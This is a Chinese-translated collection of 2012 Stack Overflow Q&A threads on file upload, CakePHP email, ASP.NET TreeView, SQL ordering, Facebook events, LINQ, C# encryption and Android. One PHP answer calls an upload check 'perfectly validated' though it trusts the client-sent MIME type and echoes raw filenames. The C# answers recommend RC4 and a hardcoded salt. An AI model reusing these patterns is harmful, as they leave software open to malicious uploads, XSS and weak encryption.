        <script src="/js/jquery.fileupload.js"></script>
        <script src="http://blueimp.github.com/JavaScript-Load-Image/load-image.min.js"></script>
        <script src="http://blueimp.github.com/JavaScript-Canvas-to-Blob/canvas-to-blob.min.js"></script>
        <script src="/js/jquery.fileupload-fp.js"></script>

        <div id="dropzone" class="fade well">Drop files here</div> 
```

我的 JS：

```
$(document).ready(function() {

                $('#fileupload').fileupload({
                    dataType: 'json',
                    dropZone: $('#dropzone'),
                    singleFileUploads: false,
                    add: function (e, data) {
                        $(this).fileupload('process', data).done(function () {
                            data.submit();
                        });
                    },
                    done: function (e, data) {
                        $.each(data.result, function (index, file) {
                            $('<p/>').text(file.name).appendTo(document.body);
                        });
                    },
                    process: [
                        {
                            action: 'load',
                            fileTypes: /^image\/(gif|jpeg|png)$/,
                            maxFileSize: 20000000 // 20MB
                        },
                        {
                            action: 'resize',
                            maxWidth: 1920,
                            maxHeight: 1080
                        },
                        {
                            action: 'save'
                        }
                    ]
                });
                $('#fileupload').bind('fileuploadsubmit', function (e, data) {
                    // The example input, doesn't have to be part of the upload form:
                    var GAL = $('#galleryId');
                    data.formData = {
                        galleryId: GAL.val(),
                        type: 'gallery',
                        entityId: 1
                    }
                    return true;
                });

                $(document).bind('dragover', function (e) {
                    var dropZone = $('#dropzone'),
                        timeout = window.dropZoneTimeout;
                    if (!timeout) {
                        dropZone.addClass('in');
                    } else {
                        clearTimeout(timeout);
                    }
                    if (e.target === dropZone[0]) {
                        dropZone.addClass('hover');
                    } else {
                        dropZone.removeClass('hover');
                    }
                    window.dropZoneTimeout = setTimeout(function () {
                        window.dropZoneTimeout = null;
                        dropZone.removeClass('in hover');
                    }, 100);
                });

                $(document).bind('drop dragover', function (e) {
                    e.preventDefault();
                }); 
```

});

我想实现的目标：

1.  在客户端调整图像大小
2.  然后将带有附加表单数据的图像（数据未发送到服务器端脚本）发送到upload.php

提前非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T10:39:35.577

Jquery 文件上传不是我要求的正确选择。我现在成功使用[Plupload](http://www.plupload.com/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:09:53.160

```
 <?php 

    //Define some variables  
          $dir = "choice_images/"; 
          $types = array("image/gif","image/jpeg","image/pjpeg","image/png","application/x-zip-compressed");  
    //Check to determine if the submit button has been pressed  
        if(isset($_POST['submit'])){  

    //Shorten Variables  
         $pollids = mysql_real_escape_string($_POST['pollid']);
         $choiceid= mysql_real_escape_string($_POST['chid']);   
         $tmp_name = $_FILES['realfile']['tmp_name'];  
         $new_name = $_FILES['realfile']['name'];
         if($new_name=="")
         {
             echo"<script>alert('Please choose file to upload');        
    </script>";

         }
     else {

    //Check MIME Type  
        if (in_array($_FILES['realfile']['type'], $types)){  

            $replacestring = str_replace(" ","_",$new_name);

         $img = time()."_".$replacestring;

         $datetime = date('m-d-Y');

//your codings

     //Move file from tmp dir to new location  
            move_uploaded_file($tmp_name,$dir . $img);  
            echo "{$_FILES['realfile']['name']} was uploaded sucessfully!";                                          
        }else{  
        //Print Error Message  
         echo "<small>File <strong><em>{$_FILES['realfile']['name']}</em></strong> Was Not Uploaded!</small><br />";  
        //Debug  
       $name =  $_FILES['realfile']['name'];  
       $type =    $_FILES['realfile']['type'];  
       $size =    $_FILES['realfile']['size'];  
       $tmp =     $_FILES['realfile']['name'];  
    //   echo "Name: $name<br/ >Type: $type<br />Size: $size<br />Tmp: $tmp";  
       echo"<script>alert('Please choose image file to upload. This is not a valid image file');       
    </script>";
        }  
        }
        }        
    else{        
    //    echo 'Could Not Upload Files';  
    }  

    ?> 
```

您可以使用这些编码进行完美验证的文件上传，如果您想添加调整图像大小等功能，则可以在此编码中使用。

# cakephp-2.0 - 使用 CakeEmail 发送电子邮件

> ID：13490250
> 
> 赞同：0
> 
> 时间：2012-11-21T09:38:54.367
> 
> 标签：cakephp-2.0

在我的 CakePHP 应用程序中，我有一个我自己制作的电子邮件表单，当单击电子邮件超链接时它会打开。然后我如何传递表单中的数据以便可以使用 CakeEmail 发送？抱歉，我已经尝试了很长时间，并检查了[http://book.cakephp.org/2.0/en/core-utility-libraries/email.html](http://book.cakephp.org/2.0/en/core-utility-libraries/email.html)上的所有文档，仍然无法弄清楚。

这是我的代码...

**电子邮件.ctp**

```
<?php $this->Html->addCrumb('New Email', '#'); ?>

<div id="email_page" class="span12">
    <div class="row">

    <?php 
        echo $this->Form->create('Email', array('controller'=>'person', 'action'=>'email_send'));
        echo $this->Form->input('email', array('class'=>'email_form','label'=>'To: ','value'=>$email['Person']['primEmail']));
        echo $this->Form->input('subject', array('class'=>'email_form','label'=>'Subject: '));
        echo $this->Form->input('message', array('class'=>'email_form email_body', 'type'=>'textarea','label'=>'Message: '));
        echo $this->Form->end('Send', array('class'=>'pull-right')); 
    ?>

    </div>
</div> 
```

**email_send.php**

```
<?php
    $email = new CakeEmail('default');
    $email->to('email');
    $email->subject('subject');
    $email->send('message');
?> 
```

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:14:02.143

表单数据将在控制器中以`$this->request->data`（可写）或`$this->data`（可读）形式提供。`$this->request->data['Email']`由于您的表单称为电子邮件，因此在提交表单后，所有数据都将可用。

我不确定您为什么要使用电子邮件代码`email_send.php`而不是使用控制器方法。表单需要`email_send`PersonsController 中存在的方法，因为表单操作设置为`/persons/email_send`。所以我会将电子邮件代码`email_send()`放在`PersonsController.php`.

所以：

```
<?php
    public function email_send() {
      $email = new CakeEmail('default');
      $email->to($this->request->data['Email']['email']);
      $email->subject($this->request->data['Email']['subject']);
      $email->send($this->request->data['Email']['message']);
    }
?> 
```

当然，当所有这些工作正常时，您应该设置适当的[验证](http://book.cakephp.org/2.0/en/models/data-validation.html)并检查是否`$this->request->data`填充了相关数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T12:13:59.797

更好的优化代码将在

```
public function email() 
{
  //add this
  if ($this->request->is('post')) {
  $post_array = $this->request->data;

  $email    = new CakeEmail();
  $email->viewVars(array('message' => $post_array['Email']['message'] ))
     ->template('contactForm')
     ->emailFormat('html')
     ->config(array('from' => 'test@test.com' ,'to' => $post_array['Email']['email']))
     ->subject ($post_array['Email']['subject'])
     ->send();

 }

} 
```

一般来说，您可以在下面定义一个名称为 contact_form.ctp 的电子邮件模板

```
/app/View/Emails/html/ 
```

并将数据传递给模板并根据您的要求格式化html。谢谢！

# asp.net - 将 Treeview 控件绑定到 xmldatasource 时，出现“异常：缺少根元素”

> ID：13490253
> 
> 赞同：0
> 
> 时间：2012-11-21T09:39:08.873
> 
> 标签：asp.net, xml, treeview, xmldatasource

.aspx 文件：

```
 <div>
    <asp:TreeView ID="TreeView1" runat="server" DataSourceID="XmlDataSource1" 
        ShowCheckBoxes="All" ShowLines="True">
    </asp:TreeView>
    <asp:XmlDataSource ID="XmlDataSource1" runat="server" DataFile="~/Details.xml">
    </asp:XmlDataSource>
  </div> 
```

详细信息.xml：

```
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <Root>
 <Collection Name="Server 1">
  <Box>MB1</Box>
  <Box>MB2</Box>
  <Box>MB3</Box>
  <Box>MB4</Box>
  <Box>MB5</Box>
  </Collection>
 </Root> 
```

堆栈跟踪：

```
 [XmlException: Root element is missing.]
 System.Xml.XmlTextReaderImpl.Throw(Exception e) +76
 System.Xml.XmlTextReaderImpl.ThrowWithoutLineInfo(String res) +61
 System.Xml.XmlTextReaderImpl.ParseDocumentContent() +3981048
 System.Xml.XmlTextReaderImpl.Read() +151
 System.Xml.XmlLoader.LoadNode(Boolean skipOverWhitespace) +58
 System.Xml.XmlLoader.LoadDocSequence(XmlDocument parentDoc) +20
 System.Xml.XmlLoader.Load(XmlDocument doc, XmlReader reader, Boolean preserveWhitespace) +129
 System.Xml.XmlDocument.Load(XmlReader reader) +108
 System.Web.UI.WebControls.XmlDataSource.PopulateXmlDocument(XmlDocument document, CacheDependency& dataCacheDependency, CacheDependency& transformCacheDependency) +306
 System.Web.UI.WebControls.XmlDataSource.GetXmlDocument() +153
 System.Web.UI.WebControls.XmlHierarchicalDataSourceView.Select() +17
 System.Web.UI.WebControls.TreeView.DataBindNode(TreeNode node) +125
 System.Web.UI.WebControls.TreeView.PerformDataBinding() +120
 System.Web.UI.WebControls.HierarchicalDataBoundControl.PerformSelect() +85
 System.Web.UI.WebControls.BaseDataBoundControl.DataBind() +73
 System.Web.UI.WebControls.TreeView.DataBind() +4
 System.Web.UI.WebControls.BaseDataBoundControl.EnsureDataBound() +82
 System.Web.UI.WebControls.BaseDataBoundControl.OnPreRender(EventArgs e) +22
 System.Web.UI.WebControls.TreeView.OnPreRender(EventArgs e) +36
 System.Web.UI.Control.PreRenderRecursiveInternal() +80
 System.Web.UI.Control.PreRenderRecursiveInternal() +171
 System.Web.UI.Control.PreRenderRecursiveInternal() +171
 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +842 
```

在加载页面时抛出异常，我尝试根据 w3cshools 验证器验证 xml 文件及其有效。什么事情会导致这个异常。纠正我哪里出错了。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:52:02.840

尝试更改您的树视图代码一次，如下所示

```
<asp:TreeView ID="TreeView1" runat="server" DataSourceID="XmlDataSource1">
<DataBindings>  
 <asp:TreeNodeBinding DataMember="Collection" TextField="Name" />  
  <asp:TreeNodeBinding DataMember="Box" TextField="Name" />  

 </DataBindings> 
</asp:TreeView> 
```

## XML

```
<?xml version="1.0" encoding="utf-8" ?>  
 <Collection Name="Server 1">
  <Box Name="MB1"></Box>
  <Box Name="MB2"></Box>
  <Box Name="MB3"></Box>
  <Box Name="MB4"></Box>
 </Collection> 
```

[树视图示例](http://asp-net-example.blogspot.in/2008/10/treeview-example-how-to-use-treeview.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:38:56.207

```
<div>
   <asp:XmlDataSource ID="XmlDataSource1" runat="server" DataFile="~/Details.xml">
   </asp:XmlDataSource>
   <asp:TreeView ID="TreeView1" runat="server" DataSourceID="XmlDataSource1" 
    ShowCheckBoxes="All" ShowLines="True">
      <DataBindings>  
          <asp:TreeNodeBinding DataMember="Collection" TextField="Name" />  
          <asp:TreeNodeBinding DataMember="Box" TextField="Name" />  
     </DataBindings> 
  </asp:TreeView>
</div> 
```

我刚刚更改了 xmldatasource 的位置，它现在可以工作了。

# java - 按水平顺序展开单元格？

> ID：13490255
> 
> 赞同：1
> 
> 时间：2012-11-21T09:39:12.590
> 
> 标签：java, html, orbeon, xforms

我们如何按水平位置扩展网格中的单元格？将两个输出文本单元格合二为一会很好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T01:46:43.557

目前，`colspan`Form Builder 不支持水平扩展单元格 ( )。仅支持垂直扩展单元格 ( `rowspan`)。

您可以更新表单的源以`colspan`在必要时添加 a ，并删除不必要`xh:td`的 ，但我不建议这样做：因为 Form Builder 没有考虑到这些`colspan`，当您使用时可能会破坏表格的结构稍后添加/删除列或垂直扩展单元格。

# mysql - SQL ORDER BY 路由信息

> ID：13490256
> 
> 赞同：16
> 
> 时间：2012-11-21T09:39:21.517
> 
> 标签：mysql, sql

我有一个随机顺序的路由信息​​表，如下所示：

```
from    to      street
----------------------------------
92      91      Lange Poten
100     104     Bagijnestraat
85      79      Korte Poten
91      85      Plein
79      100     Bezuidenhoutseweg 
```

我正在尝试找到一种使用路由信息对其进行排序的方法，其中当前行的**to**列与下一行的**from列匹配。**在示例中，我想要的顺序是：

```
from    to      street
----------------------------------
92      91      Lange Poten
91      85      Plein
85      79      Korte Poten
79      100     Bezuidenhoutseweg
100     104     Bagijnestraat 
```

**在from**或**to**列上的简单 ORDER BY不起作用，因为数字顺序不是正确的。我试图找到一种使用 SQL 或 Excel 的方法。

SQL 小提琴在这里：[http ://sqlfiddle.com/#!2/9ebbb](http://sqlfiddle.com/#!2/9ebbb)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-21T10:13:03.393

## 这适用于甲骨文

```
select a.*
from route  a
start with a.rowid = (select min(rowid) from route )
connect by prior a.t = a.f; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-21T10:27:00.390

SQL Server (2005+) 它将是

```
Declare @Routes Table([from] int, [to] int, [street] varchar(17))   
INSERT INTO @Routes VALUES
(92, 91, 'Lange Poten'),
(100, 104, 'Bagijnestraat'),
(85, 79, 'Korte Poten'),
(91, 85, 'Plein'),
(79, 100, 'Bezuidenhoutseweg')

;With  Cte AS
(
    SELECT  [from]
            ,[to]
            ,[street]
    FROM    @Routes
    WHERE   [from] = 92
    UNION ALL
    SELECT  r.[from]
            ,r.[to]
            ,r. [street]
FROM    @Routes AS r
JOIN    Cte c
ON      c.[to] = r.[from]
)

Select * From Cte 
```

![在此处输入图像描述](../Images/d051de53367266da1c502889ff6c85aa.png)

# javascript - 多个 FB.Event.subscribe 不会触发，但单个会触发

> ID：13490257
> 
> 赞同：0
> 
> 时间：2012-11-21T09:39:25.320
> 
> 标签：javascript, facebook-graph-api

我正在尝试向页面添加`comment.create`和`comment.remove`

如果我使用以下内容，一切正常：

```
window.fbAsyncInit = function(){ 
    FB.Event.subscribe('comment.create', function(response){
    $.ajax({
    type: "POST", // form method
    url: "/pages/includes/add_fb_comments.php",// destination
    data: "url=" + encodeURIComponent(response.href) + "&id=<?=$id?>&action=add",
    cache: false,
    success: function(){
    alert('Success' + encodeURIComponent(response.href) + response.commentID);
    }
    });
    });
    }; 
```

但是，无论我在哪里添加以下内容，都不会触发，ajax 不会触发，因此没有成功消息

```
FB.Event.subscribe('comment.remove', function(response){
    $.ajax({
    type: "POST", // form method
    url: "/pages/includes/add_fb_comments.php",// destination
    data: "commentID=" + response.commentID + "&action=remove",
    cache: false,
    success: function(){
    alert('removed comment: ' response.commentID);
    }
    });
}); 
```

我已经在同一尝试中尝试过，`window.fbAsyncInit = function(){`我尝试过分开`window.fbAsyncInit = function(){`我什至尝试过完全分开`<script></script>`，但他们根本不会开火。

这是一个已知问题吗？我不敢相信它们肯定会永远在一起

有任何想法吗？

这是我正在尝试的完整实际代码：

```
<div class="fb-comments" data-href="<? echo curPageURL(); ?>" data-num-posts="4" data-width="578" mobile="false"></div>
        <script>
            window.fbAsyncInit = function(){ 
                    FB.Event.subscribe('comment.create', function(response){
                        $.ajax({
                            type: "POST", // form method
                            url: "/pages/includes/add_fb_comments.php",// destination
                            data: "url=" + encodeURIComponent(response.href) + "&id=<?=$id?>&action=add",
                            cache: false,
                            success: function(){
                            alert('Success' + encodeURIComponent(response.href) + response.commentID);
                            }
                        });
                    });
            };

            window.fbAsyncInit = function(){ 
                    FB.Event.subscribe('comment.remove', function(response){
                        $.ajax({
                            type: "POST", // form method
                            url: "/pages/includes/add_fb_comments.php",// destination
                            data: "commentID=" + response.commentID + "&action=remove",
                            cache: false,
                            success: function(){
                            alert('removed comment: ' response.commentID);
                            }
                        });
                    });
            };
            </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T05:39:04.187

每个`window.fbAsyncInit`都设置相同的属性，并且由于它们是按顺序执行的，并且不是累积的，因此实际上只设置了最后一个函数。

现在，我很确定您还有第三个`fbAsyncInit =...`块，SDK 已在其中初始化，并且由于上述原因，它永远不会执行。

将所有这些移到一个单一的`fbAsyncInit`，你应该很好。

# linq - 将 sql 查询转换为 linq 查询

> ID：13490259
> 
> 赞同：2
> 
> 时间：2012-11-21T09:39:38.903
> 
> 标签：linq, sql-to-linq-conversion

我对 LINQ 很陌生，我做了很多将 SQL 查询转换为 LINQ 的尝试均不成功。请帮我解决一些问题。确切的 LINQ 是什么 .. 提前致谢。

// 只是整个查询的一部分

```
 select distinct p.IdPatient,p.IdDoc
  from patd p (NOLOCK)
     left outer join StatusChange sc (NOLOCK)
        on sc.IdPatient = p.IdPatient
           and sc.IdClinicNumber = 23430 
           and sc.IdStatus = 'A'
           and sc.DateStatusChange > GetDate()
     join TrtTyp t ON p.IdTreatmentType = t.IdTreatmentType 
           and t.TypeModality IN ('H','P')
  Where 
      p.IdType IN ('P','E','M')
      and (IsNull(p.IsInactive,0) in (1,0) or sc.IdStatusChange is not null)
      and Not Exists(
         Select 1
         From   Expire e (NOLOCK)
         Where  e.IdPatient = p.IdPatient
      )
      and p.IdClinicNumber = 23430 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T13:25:10.337

首先，你们都需要以更规范的形式重写查询，实际上不需要联接

```
select distinct
    p.IdPatient, p.IdDoc
from patd as p
where 
    p.IdClinicNumber = 23430 and
    p.IdType in ('P','E','M') and
    p.IdTreatmentType in
    (
         select tt.IdTreatmentType
         from TrtTyp as tt
         where tt.TypeModality in ('H','P')
    ) and
    (
        isnull(p.IsInactive, 0) in (1,0) or
        p.IdPatient in 
        (
            select sc.IdPatient
            from StatusChange as sc
            where
                sc.IdClinicNumber = p.IdClinicNumber and
                sc.IdStatus = 'A' and
                sc.DateStatusChange > GetDate()
        )
    ) and
    p.IdPatient not in
    (
        select e.IdPatient
        from expire as e
    ) 
```

现在您可以编写您的 LINQ。请记住，我没有你的数据来测试它

```
var query = 
from p in patds
where
    p.IdClinicNumber == 23430 &&
    (new char[] { 'P', 'E', 'M' }).Contains(p.IdType) &&
    (
        from t in TrtTyps
        where (new char[] { 'H','P' }).Contains(t.TypeModality)
        select t.IdTreatmentType
    ).Contains(p.IdTreatmentType) &&
    (
        (new int[] { 1, 0 }).Contains(p.IsInactive ?? 0) ||
        (
            from sc in StatusChanges
            where
                sc.IdClinicNumber == p.IdClinicNumber &&
                sc.IdStatus == 'A' &&
                sc.DateStatusChange > DateTime.Now
            select sc.IdPatient
        ).Contains(p.IdPatient)
    ) &&
    !(
        from e in Expires
        select e.IdPatient
    ).Contains(p.IdPatient)
select new {p.IdPatient, p.IdDoc}; 
```

# c# - C#，将字符串编码/解码为一些带有校验和的简单代码

> ID：13490261
> 
> 赞同：2
> 
> 时间：2012-11-21T09:39:46.723
> 
> 标签：c#, asp.net, encryption

我需要在 C# 中实现字符串的简单编码和解码。

我不需要“高机密”加密，所以简单的编码只要得到校验和就可以了。

我需要在一个代码实例中进行简单的双向编码解码。只有一个程序同时进行编码和解码，因此任何“密钥”都可以硬编码。

编码结果应该是字母数字（文本）。应避免二进制数据（非字母、非数字），因为字段将参​​与作为文本 CSV 表的文件。

我需要一个可以检查一致性的代码（因此它应该包括控制数字/校验和），所以我可以知道该字段没有被第三方更改并且可以有效解码。（类似于信用卡号码中的控制数字）。

代码长度应与原始字符串的长度大致相似（而不是长 5-10 倍）。

如果您将我指向 C# 中最好的库，我将不胜感激，在此先感谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T11:03:11.650

RC4 是一种简单的算法，可以很容易地实现加密/解密。它不如 AES 安全，但在您的情况下，您似乎不需要 AES 安全性。下面是来自[这个站点的 .NET 中 RC4 的实现](http://www.superstarcoders.com/blogs/posts/rc4-encryption-in-c-sharp.aspx)

```
public static class RC4
{
   public static string Encrypt(string key, string data)
   {
      Encoding unicode = Encoding.Unicode;

      return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
   }

   public static string Decrypt(string key, string data)
   {
      Encoding unicode = Encoding.Unicode;

      return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
   }

   public static byte[] Encrypt(byte[] key, byte[] data)
   {
      return EncryptOutput(key, data).ToArray();
   }

   public static byte[] Decrypt(byte[] key, byte[] data)
   {
      return EncryptOutput(key, data).ToArray();
   }

   private static byte[] EncryptInitalize(byte[] key)
   {
      byte[] s = Enumerable.Range(0, 256)
        .Select(i => (byte)i)
        .ToArray();

      for (int i = 0, j = 0; i < 256; i++)
      {
         j = (j + key[i % key.Length] + s[i]) & 255;

         Swap(s, i, j);
      }

      return s;
   }

   private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
   {
      byte[] s = EncryptInitalize(key);

      int i = 0;
      int j = 0;

      return data.Select((b) =>
      {
         i = (i + 1) & 255;
         j = (j + s[i]) & 255;

         Swap(s, i, j);

         return (byte)(b ^ s[(s[i] + s[j]) & 255]);
      });
   }

   private static void Swap(byte[] s, int i, int j)
   {
      byte c = s[i];

      s[i] = s[j];
      s[j] = c;
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:13:24.833

我已使用此代码与 rijndael 进行加密/解密。触摸加密字符串时会引发 CryptographicException。

来自[http://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C的方法](http://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C)

```
public string Encrypt(string clearText, string Password)
    {
        //Convert text to bytes
        byte[] clearBytes =
          System.Text.Encoding.Unicode.GetBytes(clearText);

        //We will derieve our Key and Vectore based on following 
        //password and a random salt value, 13 bytes in size.
        PasswordDeriveBytes pdb = new PasswordDeriveBytes(Password,
            new byte[] {0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 
        0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76});

        byte[] encryptedData = Encrypt(clearBytes,
                 pdb.GetBytes(32), pdb.GetBytes(16));

        return Convert.ToBase64String(encryptedData);
    }

    //Call following function to decrypt data
    public string Decrypt(string cipherText, string Password)
    {
        //Convert base 64 text to bytes
        byte[] cipherBytes = Convert.FromBase64String(cipherText);

        //We will derieve our Key and Vectore based on following 
        //password and a random salt value, 13 bytes in size.
        PasswordDeriveBytes pdb = new PasswordDeriveBytes(Password,
            new byte[] {0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 
        0x64, 0x76, 0x65, 0x64, 0x65, 0x76});
        byte[] decryptedData = Decrypt(cipherBytes,
            pdb.GetBytes(32), pdb.GetBytes(16));

        //Converting unicode string from decrypted data
        return Encoding.Unicode.GetString(decryptedData);
    }

    public byte[] Encrypt(byte[] clearData, byte[] Key, byte[] IV)
    {
        byte[] encryptedData;
        //Create stream for encryption
        using (MemoryStream ms = new MemoryStream())
        {
            //Create Rijndael object with key and vector
            using (Rijndael alg = Rijndael.Create())
            {
                alg.Key = Key;
                alg.IV = IV;
                //Forming cryptostream to link with data stream.
                using (CryptoStream cs = new CryptoStream(ms,
                   alg.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    //Write all data to stream.
                    cs.Write(clearData, 0, clearData.Length);
                }
                encryptedData = ms.ToArray();
            }
        }
        return encryptedData;
    }

    public byte[] Decrypt(byte[] cipherData, byte[] Key, byte[] IV)
    {
        byte[] decryptedData;
        //Create stream for decryption
        using (MemoryStream ms = new MemoryStream())
        {
            //Create Rijndael object with key and vector
            using (Rijndael alg = Rijndael.Create())
            {
                alg.Key = Key;
                alg.IV = IV;
                //Forming cryptostream to link with data stream.
                using (CryptoStream cs = new CryptoStream(ms,
                    alg.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    //Write all data to stream.
                    cs.Write(cipherData, 0, cipherData.Length);
                }
                decryptedData = ms.ToArray();
            }
        }
        return decryptedData;
    } 
```

# android - android构造函数未定义

> ID：13490266
> 
> 赞同：0
> 
> 时间：2012-11-21T09:40:01.243
> 
> 标签：android, constructor, undefined

我是安卓新手。我收到此错误：此行的构造函数 GpsData(btnReport) 未定义：

```
gps = new GpsData(btnReport.this); 
```

编码：

```
public class btnReport extends AsyncTask<String, String, Void> {
    // GPSTracker class
    GpsData gps;

    @Override
    protected Void doInBackground(String... params) {
        String artID = params[0];

        // create class object
        gps = new GpsData(btnReport.this);

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            String mlat = String.valueOf(latitude);
            String mlon = String.valueOf(longitude);

            // \n is for new line                  
            new PostData().execute(mlat, mlon, artID);

        gps.stopUsingGPS();
        return null;
    }

} 
```

我能做些什么？

这是 GpsData：

```
public class GpsData extends Service implements LocationListener {

    private final Context mContext;

    // flag for GPS status
    boolean isGPSEnabled = false;

    // flag for network status
    boolean isNetworkEnabled = false;

    // flag for GPS status
    boolean canGetLocation = false;

    Location location; // location
    double latitude; // latitude
    double longitude; // longitude

    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 1000; // 1000 meters

    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // 1 minute

    // Declaring a Location Manager
    protected LocationManager locationManager;

    public GpsData(Context context) {
        this.mContext = context;
        getLocation();
    }

    public Location getLocation() {
        try {
            locationManager = (LocationManager) mContext
                    .getSystemService(LOCATION_SERVICE);

            // getting GPS status
            isGPSEnabled = locationManager
                    .isProviderEnabled(LocationManager.GPS_PROVIDER);

            // getting network status
            isNetworkEnabled = locationManager
                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGPSEnabled && !isNetworkEnabled) {
                // no network provider is enabled
            } else {
                this.canGetLocation = true;
                // First get location from Network Provider
                if (!isNetworkEnabled) { //! hinzugefuegt
                    locationManager.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER,
                            MIN_TIME_BW_UPDATES,
                            MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                    Log.d("Network", "Network");
                    if (locationManager != null) {
                        location = locationManager
                                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (location != null) {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();
                        }
                    }
                }
                // if GPS Enabled get lat/long using GPS Services
                if (isGPSEnabled) {
                    if (location == null) {
                        locationManager.requestLocationUpdates(
                                LocationManager.GPS_PROVIDER,
                                MIN_TIME_BW_UPDATES,
                                MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                        Log.d("GPS Enabled", "GPS Enabled");
                        if (locationManager != null) {
                            location = locationManager
                                    .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            if (location != null) {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                            }
                        }
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return location;
    }

    /**
     * Stop using GPS listener
     * Calling this function will stop using GPS in your app
     * */
    public void stopUsingGPS(){
        if(locationManager != null){
            locationManager.removeUpdates(GpsData.this);
        }
    }

    /**
     * Function to get latitude
     * */
    public double getLatitude(){
        if(location != null){
            latitude = location.getLatitude();
        }

        // return latitude
        return latitude;
    }

    /**
     * Function to get longitude
     * */
    public double getLongitude(){
        if(location != null){
            longitude = location.getLongitude();
        }

        // return longitude
        return longitude;
    }

    /**
     * Function to check GPS/wifi enabled
     * @return boolean
     * */
    public boolean canGetLocation() {
        return this.canGetLocation;
    }

    /**
     * Function to show settings alert dialog
     * On pressing Settings button will lauch Settings Options
     * */
    public void showSettingsAlert(){
        AlertDialog.Builder alertDialog = new AlertDialog.Builder(mContext);

        // Setting Dialog Title
        alertDialog.setTitle("GPS is settings");

        // Setting Dialog Message
        alertDialog.setMessage("GPS is not enabled. Do you want to go to settings menu?");

        // On pressing Settings button
        alertDialog.setPositiveButton("Settings", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog,int which) {
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                mContext.startActivity(intent);
            }
        });

        // on pressing cancel button
        alertDialog.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
            dialog.cancel();
            }
        });

        // Showing Alert Message
        alertDialog.show();
    }

    @Override
    public void onLocationChanged(Location location) {
    }

    @Override
    public void onProviderDisabled(String provider) {
    }

    @Override
    public void onProviderEnabled(String provider) {
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

} 
```

好的，这是通过我的应用程序的方式：StartActivity：

```
 Intent intent = new Intent(StartActivity.this, ReportActivity.class);
        startActivity(intent); 
```

报告活动：

```
public class ReportActivity extends Activity implements OnClickListener {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.report);
        Button b = (Button) findViewById(R.id.report_TJ_btn1);
        b.setOnClickListener(this);
        b = (Button) findViewById(R.id.report_TJ_btn2);
        b.setOnClickListener(this);
        b = (Button) findViewById(R.id.report_TJ_btn3);
        b.setOnClickListener(this);
    }
    @Override
    public void onClick(View v) {
        if(v.getId()== R.id.report_TJ_btn1) {
            startActivity(new Intent(this,btnReport.class));
        }
        if(v.getId()== R.id.report_TJ_btn2) {
            startActivity(new Intent(this,btnReport.class));
        }
        if(v.getId() == R.id.report_TJ_btn3) {
            startActivity(new Intent(this,btnReport.class));
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:43:29.740

使用您的`activityname.this`（其中使用`AsycTask`）而不是您的`btnReport.this`.

```
public class btnReport extends AsyncTask<String, String, Void> {
        // GPSTracker class
        GpsData gps;

        @Override
        protected Void doInBackground(String... params) {
            String artID = params[0];

            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    gps = new GpsData(MainActivity.this);
                    double latitude = gps.getLatitude();
                    double longitude = gps.getLongitude();
                    String mlat = String.valueOf(latitude);
                    String mlon = String.valueOf(longitude);

                    // \n is for new line
                    // new PostData().execute(mlat, mlon, artID);

                    gps.stopUsingGPS();
                }
            });
            return null;
        }

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T09:46:31.793

你需要将什么样的数据类型传递给'GpsData`的构造函数？

您正在向它传递一个实例，`AsyncTask`如果您想要一个`Context`而不是（这很常见），您可以尝试：

```
gps = new GpsData(Application.getContext()); 
```

